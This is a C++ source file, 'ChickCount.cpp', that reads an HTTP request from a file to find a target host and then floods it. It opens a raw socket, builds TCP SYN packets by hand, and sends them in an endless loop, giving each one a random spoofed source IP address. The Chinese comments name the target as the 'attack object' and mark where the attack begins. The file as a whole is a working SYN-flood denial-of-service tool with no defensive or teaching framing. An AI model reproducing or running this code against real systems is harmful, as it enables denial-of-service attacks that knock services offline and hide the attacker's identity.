/***********ChickCount.cpp********************/
#include <cstdio>
#include <cstdlib>
#include <cstring>

#include <netdb.h>
#include <errno.h>
#include <unistd.h>


#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include "HTTPPack.h"

using namespace std;
using namespace proxyserver;

#define DESTPORT 8080 
#define LOCALPORT 8888

const int packet_length = 1000;

void setup_and_send_tcp_packet(const char *const file_path);

void setup_socket(const char *const hostname, const int &hostport, int &sockfd, struct sockaddr_in &addr);

void send_tcp_packet(int sockfd, struct sockaddr_in *addr, FILE * packet_file, const HTTPPack &first_pack);

unsigned short check_sum(unsigned short *addr, int len);

FILE* open_file(const char *const file_path); 

bool read_packet_from_file(FILE* packet_file, size_t &buf_length, char *packet_buf);

int main(int argc, char **argv) 
{
   if (argc != 2) 
   {
      fprintf(stderr,
              "Usage:%s packet_file_path\n\a",
              argv[0]);
      exit(1);
   }

   setup_and_send_tcp_packet(argv[1]);

   return 0;
}

/***************************************************************************//**
* @brief setup, read and send tcp paket 
*
* @param file_path   - [in]
********************************************************************************/

void setup_and_send_tcp_packet(
   const char *const file_path)
{
   int sockfd;
   struct sockaddr_in addr;
   FILE *packet_file;
   size_t packet_buf_length = packet_length;
   char packet_buf[packet_length];


   //open file
   packet_file = open_file(file_path);

   // get first http pack
   read_packet_from_file(packet_file, packet_buf_length, packet_buf);

   //buildup first http packet
   HTTPPack first_pack(packet_buf);

   if (first_pack.isValid()) 
   {
      setup_socket(first_pack.getHostName().c_str(), 
                   first_pack.getHostPort(),
                   sockfd, 
                   addr);

      // send the packet
      send_tcp_packet(sockfd, &addr, packet_file, first_pack);
   }

   fclose(packet_file);
}

/***************************************************************************//**
* @brief send tcp packet data
*
* @param sockfd      - [in]
* @param addr        - [in]
* @param packet_file - [in]
* @param first_pack  - [in]
*******************************************************************************/

void send_tcp_packet(
   int sockfd, 
   struct sockaddr_in *addr, 
   FILE * packet_file, 
   const HTTPPack &first_pack)
{
   // 放置数据包
   char buffer[packet_length];
   struct ip *ip;
   struct tcphdr *tcp;
   int head_len;

   // 数据包没有任何内容,所以长度就是两个结构的长度
   head_len = sizeof(struct ip) + sizeof(struct tcphdr);
   bzero(buffer, 100);

   // 填充数据包的头部
   ip = (struct ip *)buffer;
   ip -> ip_v = IPVERSION;// IP 版本
   ip -> ip_hl = sizeof(struct ip) >> 2;// IP 数据包头部长度
   ip -> ip_tos = 0;// 服务类型
   ip -> ip_len = htons(head_len);// 数据包长度
   ip -> ip_id = 0;// 让系统填写 ip_id
   ip -> ip_off = 0;// 同样让系统填写
   ip -> ip_ttl = MAXTTL;// 最长 TTL 时间255
   ip -> ip_p = IPPROTO_TCP;// 发送的是 TCP 包
   ip -> ip_sum = 0;// 让系统做校验和
   ip -> ip_dst = addr -> sin_addr; // 目的IP,攻击对像

   // 开始填充 TCP 数据包
   tcp = (struct tcphdr *)(buffer + sizeof(struct ip));
   tcp -> source = htons(LOCALPORT);
   tcp -> dest = addr -> sin_port;// 目的端口
   tcp -> seq = random();
   tcp -> ack_seq = 0;
   tcp -> doff = 5;
   tcp -> syn = 1; // 建立连接
   tcp -> check = 0;

   // 填充完毕,开始攻击
   for (;;) {
      // 用随机数隐藏IP
      ip -> ip_src.s_addr = random();
      // 自己校验头部,可有可无的头部
      tcp -> check = check_sum((unsigned short *)tcp,
                               sizeof(struct tcphdr));

      // send
      sendto(sockfd,buffer,head_len,
             0,
             (struct sockaddr *)addr,
             sizeof(struct sockaddr_in));
   }
}

// 首部校验和算法 
unsigned short check_sum(
   unsigned short *addr,
   int len) 
{
   register int nleft = len;
   register int sum = 0;
   register unsigned short *w = addr;
   short answer = 0;

   while(1 < nleft) 
   {
      sum += *w++;
      nleft -= sizeof(short);// short 为16位,而 char 为8位
   }

   if(1 == nleft) 
   {
      *(unsigned char *)(&answer) = *(unsigned char *)w;
      sum += answer;
   }

   sum = (sum >> 16) + (sum & 0xffff);// 将进位加到尾部
   sum += (sum >> 16);// 再将进位加到尾部
   answer = ~sum;

   return(answer);
}

/***************************************************************************//**
*
* @brief initialize socket
*
* @param hostname    - [IN]
* @param hostport    - [IN]
* @param sockfd      - [OUT]
* @param addr        - [OUT]
*******************************************************************************/

void setup_socket(
   const char *const hostname, 
   const int &hostport,
   int &sockfd, 
   struct sockaddr_in &addr)
{
   struct hostent *host;
   int on = 1;

   bzero(&addr,sizeof(struct sockaddr_in));
   addr.sin_family = AF_INET;
   addr.sin_port = htons(hostport);

   if (0 == inet_aton(hostname, &addr.sin_addr)) 
   {
      host = gethostbyname(hostname);
      if(NULL == host) 
      {
         fprintf(stderr,
                 "HostName Error:%s\n\a",
                 strerror(h_errno));
         exit(1);
      }
      addr.sin_addr = *(struct in_addr *)(host -> h_addr);
   }

   // 使用 IPPROTO_TCP 创建一个 TCP 的原始套接字
   sockfd =  socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
   if (0 > sockfd) 
   {
      fprintf(stderr,
              "Socket Error:%s",
              strerror(errno));
      exit(1);
   }

   // 设置 IP 数据包格式,告诉系统内核模块IP数据包由我们自己来填写
   setsockopt(sockfd,
              IPPROTO_IP,
              IP_HDRINCL,
              &on,
              sizeof(on));
   // 只有超级用户才能使用原始套接字
   setuid(getpid());
}

/***************************************************************************//**
*  @brief open file
*
*  @param file_path [in]
*
*  @return file fd
*******************************************************************************/

FILE* open_file(
   const char * const file_path)
{
   FILE *packet_file;

   if (NULL == (packet_file = fopen(file_path, "r"))) 
   {
      fprintf(stderr,"Open %s Error:%s\n", 
              file_path, 
              strerror(errno));
      exit(-1);
   }

   return packet_file;
}

/***************************************************************************//**
* @brief read packet from file
*
* @param fild_fd     - [in]
* @param buf_length  - [out]
* @param packet_buf  - [out]
*
* @return status(success or not)
********************************************************************************/

bool read_packet_from_file(
   FILE* packet_file,
   size_t &buf_length,
   char * packet_buf)
{
   bool read_success = true;

   if (EOF == getline(&packet_buf, 
                      &buf_length,
                      packet_file))
   {
      fprintf(stderr,"Read packet from file failure. Error:%s\n", 
              strerror(errno));
      read_success = false;
   }

   return read_success;
}

